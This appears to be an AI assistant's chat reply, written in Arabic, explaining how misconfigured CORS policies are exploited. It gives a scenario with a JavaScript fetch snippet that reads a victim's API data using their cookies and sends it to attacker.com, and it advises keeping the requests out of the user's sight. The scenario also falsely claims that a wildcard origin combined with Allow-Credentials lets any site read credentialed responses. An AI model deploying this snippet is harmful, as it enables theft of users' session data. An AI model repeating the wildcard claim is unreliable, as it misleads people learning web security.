أعتذر على اللبس! فهمت الآن أنك تريد الشرح الكامل لـ **CORS Exploiting Misconfigured** مكتوبًا مباشرة في الشات بدون وضعه في ملف أو داخل علامة `<xaiArtifact>`، وبنفس الهيكلية المطلوبة (ما المقصود؟، لماذا يعمل؟، كيف يتم الاستغلال؟، السناريو، الخطوات العملية، وجميع المحاولات الممكنة) باللغة العربية. سأقدم الشرح الآن بشكل واضح ومنظم، مع الحفاظ على التفاصيل العملية والشاملة، وبتنسيق نصي عادي يناسب الشات، دون أي علامات أو تنسيقات ملفات.

---

## فهم استغلال إعدادات CORS الخاطئة (CORS Exploiting Misconfigured)

### ما المقصود؟
استغلال إعدادات CORS الخاطئة هو عملية استهداف التهيئة غير الصحيحة لسياسة Cross-Origin Resource Sharing (CORS)، وهي آلية أمان في المتصفحات تتحكم في كيفية السماح لنطاقات مختلفة بالوصول إلى موارد موقع ويب، مثل واجهات برمجية (APIs) أو بيانات المستخدم. تعتمد CORS على رؤوس HTTP مثل Access-Control-Allow-Origin لتحديد النطاقات المسموح لها. إذا كانت هذه الإعدادات ضعيفة (مثل السماح بجميع النطاقات باستخدام * أو قبول نطاقات غير موثوقة)، يمكن للمهاجم إنشاء صفحة ويب ضارة ترسل طلبات إلى الموقع المستهدف لسرقة بيانات حساسة (مثل أسماء المستخدمين أو الرموز) أو تنفيذ إجراءات غير مصرح بها (مثل تغيير كلمة المرور).

### لماذا يعمل؟
- إعدادات CORS غير صارمة: السماح بجميع النطاقات (Access-Control-Allow-Origin: *) أو نطاقات غير موثوقة يسمح لأي موقع بإرسال طلبات.
- تجاوز قيود المتصفح: سياسة Same-Origin Policy تمنع الطلبات عبر النطاقات، لكن إعدادات CORS الخاطئة تتيح تجاوز هذا الحظر.
- إرسال بيانات الجلسة: إذا سمح الخادم بإرسال ملفات تعريف الارتباط أو الرموز (مع Access-Control-Allow-Credentials: true)، يمكن للمهاجم استغلال جلسة المستخدم.
- عدم التحقق من رأس Origin: بعض الخوادم تقبل قيم Origin مزيفة أو تستخدم قوائم بيضاء ضعيفة تحتوي على نطاقات يمكن للمهاجم التحكم بها.
- الاعتماد على JavaScript: يمكن استخدام شيفرات JavaScript في صفحة ضارة لإرسال طلبات تلقائية باستخدام بيانات الجلسة المخزنة في المتصفح.

### كيف يتم الاستغلال؟
- يحدد المهاجم موقعًا أو واجهة برمجية بها إعدادات CORS ضعيفة (مثل السماح بـ * أو نطاقات غير موثوقة).
- ينشئ صفحة ويب ضارة تحتوي على شيفرة JavaScript (مثل fetch أو XMLHttpRequest) ترسل طلبات إلى الخادم المستهدف.
- تُصمم الشيفرة لاستخراج بيانات حساسة (مثل بيانات JSON من API) أو تنفيذ إجراءات (مثل إرسال طلب POST لتغيير الإعدادات).
- يُخدع المستخدم لزيارة الصفحة الضارة (عبر روابط تصيد أو إعلانات)، مما يؤدي إلى تنفيذ الطلبات باستخدام جلسة المستخدم.
- يراقب المهاجم الاستجابات:
  - نجاح (True): يتم استخراج البيانات أو تنفيذ الإجراء، وتُرسل النتائج إلى خادم المهاجم.
  - فشل (False): يتم حظر الطلب بسبب إعدادات CORS صارمة أو عدم وجود جلسة.
- تُصمم الشيفرة لتكون غير ملحوظة (مثل إرسال الطلبات في الخلفية) لتجنب اكتشاف المستخدم.

### السناريو
لنفترض أنك اكتشفت أن موقع https://example.com يحتوي على واجهة برمجية عند /api/user تُرجع بيانات حساسة (مثل اسم المستخدم والبريد الإلكتروني) عند إرسال طلب GET. باستخدام أداة مثل Burp Suite، تلاحظ أن الخادم يُرجع رأس Access-Control-Allow-Origin: * مع Access-Control-Allow-Credentials: true، مما يعني أن أي نطاق يمكنه الوصول إلى البيانات مع إرسال ملفات تعريف الارتباط. تقوم بإنشاء صفحة ضارة على نطاقك http://attacker.com تحتوي على الشيفرة التالية:

fetch('https://example.com/api/user', {credentials: 'include'})
  .then(response => response.json())
  .then(data => fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(data)}));

عندما يزور المستخدم صفحتك، يتم إرسال طلب إلى /api/user باستخدام ملفات تعريف الارتباط الخاصة به، وتُرسل البيانات المستخرجة إلى خادمك، مما يؤكد نجاح الهجوم.
